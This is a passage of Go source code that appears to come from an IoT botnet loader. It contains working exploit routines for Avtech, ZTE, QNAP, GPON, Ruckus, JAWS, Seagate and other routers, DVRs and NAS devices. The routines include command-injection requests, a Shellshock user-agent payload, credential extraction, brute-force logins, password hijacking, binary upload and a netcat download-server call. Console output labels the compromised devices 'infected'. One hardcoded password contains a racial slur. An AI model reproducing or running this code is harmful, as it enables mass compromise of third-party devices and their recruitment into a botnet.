	time.Sleep(5 * time.Second)

	username, password := checkCredLeak(target)

	if username == "" || password == "" {
		return
	}

	auth := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))
	fmt.Printf("\x1b[38;5;46mAvtech:"+username+":"+password+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m leaked credentials\x1b[38;5;15m\r\n", target)

	avTechSendPayload(target, auth)
	time.Sleep(3 * time.Second)
	avtechChangePassBack(target, username, password)

	fmt.Printf("\x1b[38;5;46mAvtech:"+username+":"+password+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m exploited\x1b[38;5;15m\r\n", target)
	payloadSent++

	logDevice(target, "avtech")
}

func ZTEwaitForPrompt(conn net.Conn, prompt string) bool {
	buff := make([]byte, 1024)

	conn.SetDeadline(time.Now().Add(timeout))
	conn.Read(buff)

	if strings.Contains(strings.ToLower(string(buff)), prompt) {
		return true
	}

	return false
}

func ZTEwaitForExecPrompt(conn net.Conn) bool {
	for {
		buff := make([]byte, 1024)
		conn.SetDeadline(time.Now().Add(120 * time.Second))
		len, err := conn.Read(buff)

		if len <= 0 || err != nil {
			return false
		}

		if strings.Contains(string(buff), executeMessage) {
			return true
		}
	}

	return false
}

func ZTEwaitForLoginPrompt(conn net.Conn) bool {
	for {
		buff := make([]byte, 1024)
		conn.SetDeadline(time.Now().Add(timeout))
		len, err := conn.Read(buff)

		if len <= 0 || err != nil {
			return false
		}

		if strings.Contains(strings.ToLower(string(buff)), "#") {
			return false
		}

		if strings.Contains(strings.ToLower(string(buff)), "limited") {
			return true
		}

		if strings.Contains(strings.ToLower(string(buff)), "login:") {
			return true
		}
	}

	return false
}

func ZTEwaitForShellPrompt(conn net.Conn) (bool, bool) {
	for {
		buff := make([]byte, 1024)
		conn.SetDeadline(time.Now().Add(timeout))
		len, err := conn.Read(buff)

		if len <= 0 || err != nil {
			return false, false
		}

		if strings.Contains(strings.ToLower(string(buff)), "#") {
			return true, false
		}

		if strings.Contains(strings.ToLower(string(buff)), "ncorrect") {
			return false, true
		}
	}

	return false, false
}

func ZTEwaitForPasswordPrompt(conn net.Conn) bool {
	for {
		buff := make([]byte, 1024)
		conn.SetDeadline(time.Now().Add(timeout))
		len, err := conn.Read(buff)

		if len <= 0 || err != nil {
			return false
		}

		if strings.Contains(strings.ToLower(string(buff)), "password:") {
			return true
		}
	}

	return false
}

func zteEextractAuth(target string) (string, string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return "", ""
	}

	defer conn.Close()

	data := "------WebKitFormBoundaryXp5bWpRzkkYV6AiL\nContent-Disposition: form-data; name=\"config\"\n------WebKitFormBoundaryXp5bWpRzkkYV6AiL--"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /getpage.gch?pid=101&nextpage=manager_dev_config_t.gch HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nConnection: keep-alive\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXp5bWpRzkkYV6AiL\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	resp := buff.String()
	respStart := len(strings.Split(resp, "\x78\xda\xed")[0])

	if respStart <= 0 {
		return "", ""
	}

	zlibData := resp[respStart:]

	var zlibSlice bytes.Buffer
	zlibSlice.WriteString(zlibData)

	var out bytes.Buffer
	r, _ := zlib.NewReader(&zlibSlice)

	if r == nil {
		return "", ""
	}

	io.Copy(&out, r)

	authData := out.String()

	usernameData := strings.Split(authData, "<DM name=\"TS_UName\" val=\"")

	if len(usernameData) > 1 {
		username := strings.Split(usernameData[1], "\"")[0]
		passwordData := strings.Split(authData, "<DM name=\"TS_UPwd\" val=\"")

		if len(passwordData) > 1 {
			password := strings.Split(passwordData[1], "\"")[0]
			return username, password
		}
	}

	return "", ""
	//fmt.Printf("%d\n", respStart)
}

func ZTEwaitForLogin(conn net.Conn) (bool, bool) {
	for {
		buff := make([]byte, 1024)
		conn.SetDeadline(time.Now().Add(timeout))
		len, err := conn.Read(buff)

		if len <= 0 || err != nil {
			return false, false
		}

		if strings.Contains(strings.ToLower(string(buff)), "limited") {
			return false, true
		}

		if strings.Contains(strings.ToLower(string(buff)), "login:") {
			return true, false
		}
	}

	return false, false
}

func ZTEwaitForBusyboxPrompt(conn net.Conn) bool {
	for {
		buff := make([]byte, 1024)
		conn.SetDeadline(time.Now().Add(timeout))
		len, err := conn.Read(buff)

		if len <= 0 || err != nil {
			return false
		}

		if strings.Contains(string(buff), "BOTNET: applet not found") {
			return true
		}

		if strings.Contains(string(buff), "phil") {
			return true
		}

	}

	return false
}

func zteBrute(target, username, password string) (bool, bool, bool) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false, false, false
	}

	defer conn.Close()

	res, limited := ZTEwaitForLogin(conn)

	if !res {
		return false, false, limited
	}

	conn.Write([]byte(username + "\r\n"))

	if !ZTEwaitForPasswordPrompt(conn) {
		return false, false, false
	}

	conn.Write([]byte(password + "\r\n"))

	res, invalid := ZTEwaitForShellPrompt(conn)

	if !res {
		return false, invalid, false
	}

	conn.Write([]byte("/bin/busybox BOTNET; ls /home\r\n"))

	if !ZTEwaitForBusyboxPrompt(conn) {
		return false, false, false
	}

	conn.Write([]byte(ztePayload + "\r\n"))

	if !ZTEwaitForExecPrompt(conn) {
		return false, false, false
	}

	return true, false, false
}

func ZTEloadDevice(target, login string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	if !ZTEwaitForLoginPrompt(conn) {
		return
	}

	conn.Close()

	for {
		username := strings.Split(login, ":")[0]
		password := strings.Split(login, ":")[1]

		res, invalid, limited := zteBrute(target, username, password)

		if res {
			fmt.Printf("\x1b[38;5;46mZTE:"+username+":"+password+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)
			payloadSent++

			logDevice(target, "zte")
			return
		}

		if invalid {
			return
		}

		if limited {
			time.Sleep(20 * time.Second)
		}
	}
}

func verifyZteDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Mini web server 1.0") && strings.Contains(buff.String(), "2005")
}

func ZTEexploitDevice(target string) {

	if !verifyZteDevice(target) {
		return
	}

	username, password := zteEextractAuth(target)

	if username == "" || password == "" {
		return
	}

	//fmt.Printf("\x1b[38;5;46mZTE:" + username + ":" + password + "\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m found login\x1b[38;5;15m\r\n", target)

	ip := strings.Split(target, ":")[0]
	ZTEloadDevice(ip+":23", username+":"+password)
}

func multiDvrparseHtml(buff, val string) string {
	buffStr := strings.Split(buff, "<input id=\""+val+"\" type=\"text\" style=\"width: 200px\" value=\"")

	if len(buffStr) > 1 {
		html := strings.Split(buffStr[1], "\"")

		if len(html) > 0 {
			return html[0]
		}
	}

	return ""
}

func multiDvrgetHtmlVal(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("GET /cgi-bin/admin_console.cgi HTTP/1.1\r\nHost: " + target + "\r\nConnection: keep-alive\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return buff.String()
}

func multiDvrsendPayload(target, key, pwd string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	//data := "category=system_cmd&key=" + key + "&pwd=" + pwd + "&cmd=" + payload + ""

	params := url.Values{}
	params.Add("category", "system_cmd")
	params.Add("key", key)
	params.Add("pwd", pwd)
	params.Add("cmd", multiDvrPayload)

	data := params.Encode()
	cntLen := strconv.Itoa(len(data))

	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("POST /cgi-bin/admin_console_core.cgi HTTP/1.1\r\nHost: " + target + "\r\nContent-Length: " + cntLen + "\r\nConnection: keep-alive\r\nUser-Agent: " + userAgent + "\r\n\r\n" + data))

	payloadSent++

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func infectFunctionMultiDvr(target string) {

	html := multiDvrgetHtmlVal(target)

	key := multiDvrparseHtml(html, "key")
	date := multiDvrparseHtml(html, "date")

	if key == "" || date == "" {
		return
	}

	data := "$$_NVR ONETIME PWD IS '" + date + "' AND '" + key + "' AND JAKE 700924_$$"

	hash := md5.Sum([]byte(data))

	pwd := base64.StdEncoding.EncodeToString(hash[:8])

	fmt.Printf("\x1b[38;5;46mMultiDvr:"+key+":"+pwd+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)
	multiDvrsendPayload(target, key, pwd)

	logDevice(target, "multidvr")
}

func pdvrLoginDevice(target string) bool {

	t := dac.NewTransport("pineadmin", "000000")
	req, err := http.NewRequest("GET", "http://"+target+"/cmd.cgi", nil)

	if err != nil {
		return false
	}

	resp, err := t.RoundTrip(req)

	if err != nil {
		return false
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	return strings.Contains(string(body), "document.all.cmd_result")
}

func pdvrInfectDevice(target string) {

	if !pdvrLoginDevice(target) {
		return
	}

	dr := dac.NewRequest("pineadmin", "000000", "POST", "http://"+target+"/cmd.cgi", "cmd="+pdvrPayload)
	dr.Execute()

	fmt.Printf("\x1b[38;5;46mPDVR:pineadmin:000000\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)
	payloadSent++
}

func gargoyleLoadBot(target, hash, exp, cred string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	conn.SetDeadline(time.Now().Add(timeout))

	defer conn.Close()

	creds := strings.Split(cred, ":")
	username := creds[0]

	payload := "commands=" + gargoylePayload + "&hash=" + hash
	content_len := len(payload)

	request := fmt.Sprintf("POST /utility/run_commands.sh HTTP/1.1\r\nCookie: hash=%s; exp=%s; name=%s\r\nContent-type: application/x-www-form-urlencoded\r\nUser-Agent: "+userAgent+"\r\nContent-Length: %d\r\n\r\n%s", hash, exp, username, content_len, payload)
	conn.Write([]byte(request))

	var bytes bytes.Buffer
	io.Copy(&bytes, conn)

	return strings.Contains(bytes.String(), executeMessage)
}

func gargoyleLoginDevice(target, cred string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	conn.SetDeadline(time.Now().Add(timeout))

	defer conn.Close()

	creds := strings.Split(cred, ":")
	username := creds[0]
	password := creds[1]

	payload := "name=" + username + "&password=" + password
	content_len := len(payload)

	request := fmt.Sprintf("POST /utility/get_password_cookie.sh HTTP/1.1\r\nContent-type: application/x-www-form-urlencoded\r\nUser-Agent: "+userAgent+"\r\nContent-Length: %d\r\n\r\n%s", content_len, payload)
	conn.Write([]byte(request))

	var bytes bytes.Buffer
	io.Copy(&bytes, conn)
	buf := bytes.String()

	if !strings.Contains(buf, "Set-Cookie") || !strings.Contains(buf, ";") {
		return false
	}

	hashStr := strings.Split(buf, "Set-Cookie:hash=")

	if len(hashStr) <= 1 {
		return false
	}

	hash := strings.Split(hashStr[1], ";")[0]

	expStr := strings.Split(buf, "Set-Cookie:exp=")

	if len(expStr) <= 1 {
		return false
	}

	exp := strings.Split(expStr[1], ";")[0]

	// make arch check
	//fmt.Printf("\x1b[38;5;46mGargoyle:%s:%s\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m logged in\x1b[38;5;15m\r\n", target, hash, exp)

	if gargoyleLoadBot(target, hash, exp, cred) {
		fmt.Printf("\x1b[38;5;46mGargoyle:%s\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target, cred)
		payloadSent++

		logDevice(target, "gargoyle")

		return true
	}

	return false
}

func gargoyleInfectFunction(target string) {
	for _, cred := range gargoyleLogins {

		if gargoyleLoginDevice(target, cred) {
			return
		}
	}
}

func goCloudHandleClient(client net.Conn) {
	defer client.Close()

	for _, cmd := range goCloudPayloads {
		client.Write([]byte(cmd))
	}
}

func goCloudreverseServer(port string) {
	server, err := net.Listen("tcp", "0.0.0.0:"+port)

	if err != nil {
		log.Fatal(err)
	}

	for {

		client, err := server.Accept()

		if err != nil {
			return
		}

		if addr, ok := client.RemoteAddr().(*net.TCPAddr); ok {
			fmt.Printf("\x1b[38;5;46mGoCloud\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m received connection\x1b[38;5;15m\n", addr.IP.String())
			reverseShells++
		}

		go goCloudHandleClient(client)
	}
}

func goCloudConfirmPayload(target, authCookie string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /cgi-bin/webui/admin/tools/app_ping/diag_ping/%20;sh%20cmd%202%3e%261%3b/5/6/a.com?_=0.34726014511180714 HTTP/1.1\r\nHost: " + target + "\r\nCookie: " + authCookie + "\r\nReferer: http://" + target + "/cgi-bin/webui/admin/tools/app_ping\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func goCloudSendPayload(target, authCookie string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /cgi-bin/webui/admin/tools/app_ping/diag_ping/%20;nc%20" + reverseDownloadServer + "%208999%20%3e%20cmd%3b/5/6/a.com?_=0.34726014511180714 HTTP/1.1\r\nHost: " + target + "\r\nCookie: " + authCookie + "\r\nReferer: http://" + target + "/cgi-bin/webui/admin/tools/app_ping\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func goCloudLoginDevice(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	auth := "username=admin&password=admin"
	cntLen := strconv.Itoa(len(auth))

	conn.Write([]byte("POST /cgi-bin/webui/admin HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/cgi-bin/webui/admin\r\nContent-Length: " + cntLen + "\r\nUser-Agent: " + userAgent + "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" + auth))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	headers := buff.String()

	if strings.Contains(headers, "Set-Cookie:") {
		cookieData := strings.Split(headers, "Set-Cookie: ")

		if len(cookieData) > 1 {
			cookie := strings.Split(cookieData[1], ";")

			if len(cookie) > 0 {
				return cookie[0]
			}
		}
	}

	return ""
}

func goCloudExploitDevice(target string) {

	authCookie := goCloudLoginDevice(target)

	if authCookie == "" {
		return
	}

	fmt.Printf("\x1b[38;5;46mGoCloud:%s\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m sending payload\x1b[38;5;15m\r\n", authCookie, target)
	payloadSent++

	goCloudSendPayload(target, authCookie)
	time.Sleep(2 * time.Second)
	goCloudConfirmPayload(target, authCookie)
}

func qnapInfectFunction(target string) {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	cntLen := strconv.Itoa(229 + len(qnapPayload))

	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("POST /cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4= HTTP/1.0\r\nDNT: 1\r\nHost: " + target + "\r\nReferer: http://" + target + "/cgi-bin/server/server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nConnection: closed\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + cntLen + "\r\n\r\ntime_mode=0&time_YEAR=0&time_MONTH=0&time_DAY=0&time_HOUR=0&time_MINUTE=0&time_SECOND=0&TIMEZONE=50&year=&month=&day=&CONFIGURE_NTP=on&SPECIFIC_SERVER=%24%28" + qnapPayload + "%29&CONFIGURE_NTP_SYNC_BY_PRESET_TIME=on&SYNC_PRESET_TIME_HOURS=0"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "HTTP/1.0 200 OK") {
		fmt.Printf("\x1b[38;5;46mQnap\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)
	}
}

func baicellsInfectFunction(target string) {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	for _, payload := range baicellsPayload {
		conn.Write([]byte("GET /utility/run_warn_command.sh?commands=" + payload + " HTTP/1.1\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: " + userAgent + "\r\n\r\n"))
	}

	var bytes bytes.Buffer
	io.Copy(&bytes, conn)

	fmt.Printf("\x1b[38;5;46mBaicells\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)
	payloadSent++
}

func indiaGponInfectTelnet(target string) {

	conn, err := net.DialTimeout("tcp", target+":23", timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	if !waitForPromptBanner(conn, "TJ2100N GPON ONT") {
		return
	}

	conn.Write([]byte("user\r\n"))

	if !waitForPromptBanner(conn, ":") {
		return
	}

	conn.Write([]byte("niggerDD83@@\r\n"))

	if !waitForPromptBanner(conn, ">") {
		return
	}

	fmt.Printf("\x1b[38;5;46mIndiaGpon:23\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m logged in\x1b[38;5;15m\r\n", target)

	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("ping ;p=;" + indiaGponPayload + ";\r\n"))

	if !waitForPromptBanner(conn, executeMessage) {
		return
	}

	fmt.Printf("\x1b[38;5;46mIndiaGpon:23\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)

	logDevice(target, "gpon")
	payloadSent++
}

func indiaGponGetSessionKey(target, cred string) string {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	conn.SetDeadline(time.Now().Add(timeout))
	defer conn.Close()

	conn.Write([]byte("GET /password.html HTTP/1.1\r\nAuthorization: Basic " + cred + "\r\n\r\n"))

	var buf bytes.Buffer
	io.Copy(&buf, conn)

	buff := buf.String()

	keySplice := strings.Split(buff, "loc += '&sessionKey=")

	if len(keySplice) < 2 {
		return ""
	}

	key := strings.Split(keySplice[1], ";")[0]

	//fmt.Printf("Key: %s\n", key)
	return key
}

func indiaGponChangePassword(target, origUsername, origPassword, cred string) {

	key := indiaGponGetSessionKey(target, indiaGponDefaultAuth)

	if key == "" {
		return
	}

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	conn.SetDeadline(time.Now().Add(timeout))
	defer conn.Close()

	conn.Write([]byte("GET /password.cgi?inUserName=" + origUsername + "&inPassword=niggerDD83@@&inOrgPassword=" + origPassword + "&sessionKey=" + key + " HTTP/1.1\r\nAuthorization: Basic " + cred + "\r\n\r\n"))

	var buf bytes.Buffer
	io.Copy(&buf, conn)

	if strings.Contains(buf.String(), "Password change successful") {

		fmt.Printf("\x1b[38;5;46mIndiaGpon\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m changed password\x1b[38;5;15m\r\n", target)
	}
}

func indiaGponResetDevice(target string) {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	conn.Write([]byte("GET /radio.asp HTTP/1.1\r\nAuthorization: Basic " + indiaGponDefaultAuth + "\r\n\r\n"))

	var buf bytes.Buffer
	io.Copy(&buf, conn)

	if strings.Contains(buf.String(), "200") {
		fmt.Printf("\x1b[38;5;46mIndiaGpon\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m logged in with DEFAULT creds\x1b[38;5;15m\r\n", target)

		/* cred changed here so */
		indiaGponChangePassword(target, "user", "user", indiaGponDefaultAuth)
		time.Sleep(5 * time.Second)

		indiaGponChangePassword(target, "admin", "admin", indiaGponDefaultAuth)

		time.Sleep(5 * time.Second)

		ip := strings.Split(target, ":")
		indiaGponInfectTelnet(ip[0])
	}
}

func indiaGponInfectFunction(target string) {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	conn.Write([]byte("GET /radio.asp HTTP/1.1\r\nAuthorization: Basic " + indiaGponAuth + "\r\n\r\n"))

	var buf bytes.Buffer
	io.Copy(&buf, conn)

	if strings.Contains(buf.String(), "200") {
		fmt.Printf("\x1b[38;5;46mIndiaGpon\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m logged in\x1b[38;5;15m\r\n", target)

		ip := strings.Split(target, ":")
		indiaGponInfectTelnet(ip[0])

		/* we change pw */
		//changePassword(target, "user", "user")
	} else {
		indiaGponResetDevice(target)
	}
}

func ruckusFindFunction(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /login.asp HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))

	for {
		bytebuf := make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			return false
		}

		if strings.Contains(string(bytebuf), "Ruckus") {
			return true
		}
	}

	return false
}

func ruckusInfectFunction(target string) {

	if !ruckusFindFunction(target) {
		return
	}

	ip := strings.Split(target, ":")[0]

	conn, err := net.DialTimeout("tcp", ip+":2323", timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	if !waitForPromptBanner(conn, "Please login") {
		return
	}

	fmt.Printf("\x1b[38;5;46mRuckus\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m found device\x1b[38;5;15m\r\n", target)

	conn.Write([]byte("super\r\n"))

	if !waitForPromptBanner(conn, "password") {
		return
	}

	conn.Write([]byte("sp-admin\r\n"))

	fmt.Printf("\x1b[38;5;46mRuckus\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m logged in CLI\x1b[38;5;15m\r\n", target)

	if !waitForPromptBanner(conn, "rkscli") {
		return
	}

	conn.Write([]byte("!v54!\r\n"))

	if !waitForPromptBanner(conn, "chow") {
		return
	}

	conn.Write([]byte("\r\n"))

	if !waitForPromptBanner(conn, "#") {
		return
	}

	conn.Write([]byte(ruckusPayload + "\r\n"))
	payloadSent++

	if !waitForPromptBanner(conn, executeMessage) {
		return
	}

	logDevice(target, "ruckus")

	fmt.Printf("\x1b[38;5;46mRuckus\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)
	time.Sleep(5 * time.Second)
}

func unauthDvrCheckBot(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.Write([]byte("GET /cgi-bin/slogin/login.py HTTP/1.1\r\nHost: " + target + "\r\nAccept: */*\r\nUser-Agent: () { :; }; echo ; echo ; /bin/echo -ne \"\x6b\x61\x6d\x69\"\r\n\r\n"))

	buff := make([]byte, 1024)
	conn.Read(buff)

	return strings.Contains(string(buff), "kami")
}

func unauthDvrUploadBot(target string) {
	fmt.Printf("\x1b[38;5;46mUnauthDVR\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m found working\x1b[38;5;15m\r\n", target)

	dlr := readArch("dlrs/dlr.x86")

	for idx, dlr_hex := range dlr {
		conn, err := net.DialTimeout("tcp", target, timeout)

		if err != nil {
			return
		}

		defer conn.Close()

		if idx == 0 {
			conn.Write([]byte("GET /cgi-bin/slogin/login.py HTTP/1.1\r\nHost: " + target + "\r\nAccept: */*\r\nUser-Agent: () { :; }; echo ; echo ; /bin/echo -ne \"" + dlr_hex + "\" > /tmp/hello\r\n\r\n"))
		} else {
			conn.Write([]byte("GET /cgi-bin/slogin/login.py HTTP/1.1\r\nHost: " + target + "\r\nAccept: */*\r\nUser-Agent: () { :; }; echo ; echo ; /bin/echo -ne \"" + dlr_hex + "\" >> /tmp/hello\r\n\r\n"))
		}

		buff := make([]byte, 1024)
		conn.Read(buff)
	}
}

func unauthDvrLoadBot(target string, command string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /cgi-bin/slogin/login.py HTTP/1.1\r\nHost: " + target + "\r\nAccept: */*\r\nUser-Agent: () { :; }; echo ; echo ; " + command + "\r\n\r\n"))

	buff := make([]byte, 4096)
	conn.Read(buff)

	if strings.Contains(string(buff), executeMessage) {
		fmt.Printf("\x1b[38;5;46mUnauthDVR\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)
	}
}

func unauthDvrInfectFunction(target string) {

	if !unauthDvrCheckBot(target) {
		return
	}

	unauthDvrUploadBot(target)

	for _, payload := range unauthDvrPayloads {
		unauthDvrLoadBot(target, payload)
	}
}

func jawsCheckBot(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	conn.SetDeadline(time.Now().Add(timeout))

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nConnection: keep-alive\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	for {
		buf := make([]byte, 1024)
		len, err := conn.Read(buf)

		if len <= 0 {
			return false
		}

		if err != nil {
			return false
		}

		if strings.Contains(string(buf), "JAWS/1.0") {
			return true
		}
	}

	return false
}

func jawsVerifyBot(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	conn.SetDeadline(time.Now().Add(timeout))

	defer conn.Close()

	conn.Write([]byte("GET /shell?uname+-m HTTP/1.1\r\nConnection: keep-alive\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	for {
		buf := make([]byte, 1024)
		len, err := conn.Read(buf)

		if len <= 0 {
			return ""
		}

		if err != nil {
			return ""
		}

		archBuff := strings.ToLower(string(buf))

		if strings.Contains(archBuff, "arm") {

			if strings.Contains(archBuff, "armv7") {
				return "arm7"
			} else if strings.Contains(archBuff, "armv6") {
				return "arm6"
			} else if strings.Contains(archBuff, "armv5") {
				return "arm5"
			} else if strings.Contains(archBuff, "armv4") {
				return "arm"
			}
		}
	}

	return ""
}

func infectFunctionJaws(target string) {

	if !jawsCheckBot(target) {
		return
	}

	arch := jawsVerifyBot(target)

	if arch == "" {
		return
	}

	fmt.Printf("\x1b[38;5;46mJaws:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m detected arch\x1b[38;5;15m\r\n", arch, target)

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	conn.SetDeadline(time.Now().Add(timeout))

	defer conn.Close()

	payload := fmt.Sprintf(jawsPayload, arch, arch, arch, arch)

	conn.Write([]byte("GET /shell?" + payload + " HTTP/1.1\r\nUser-Agent: " + userAgent + "\r\nConnection: keep-alive\r\n\r\n"))

	fmt.Printf("\x1b[38;5;46mJaws:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m sent payload\x1b[38;5;15m\r\n", arch, target)
	payloadSent++

	for {
		buf := make([]byte, 1024)
		len, err := conn.Read(buf)

		if len <= 0 {
			return
		}

		if err != nil {
			return
		}

		if strings.Contains(string(buf), executeMessage) {
			fmt.Printf("\x1b[38;5;46mJaws:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", arch, target)

			logDevice(target, "jaws")
		}
	}
}

func seaGateCheckBot(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /backupmgt/localJob.php?session=fail`id` HTTP/1.0\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "rsync")
}

func infectFunctionSeaGate(target string) {

	if !seaGateCheckBot(target) {
		return
	}

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /backupmgt/localJob.php?session=fail`" + seaGatePayload + "` HTTP/1.0\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "rsync") {
		fmt.Printf("\x1b[38;5;46mSeaGate\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m sent payload\x1b[38;5;15m\r\n", target)
		payloadSent++

		logDevice(target, "seagate")
	}
}

func SDTcheckBot(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=id HTTP/1.1\r\nHost: " + target + "\r\nDNT: 1\r\nConnection: keep-alive\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	/* hello */
	return strings.Contains(buff.String(), "CmdResult")
}

func SDTfindBot(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

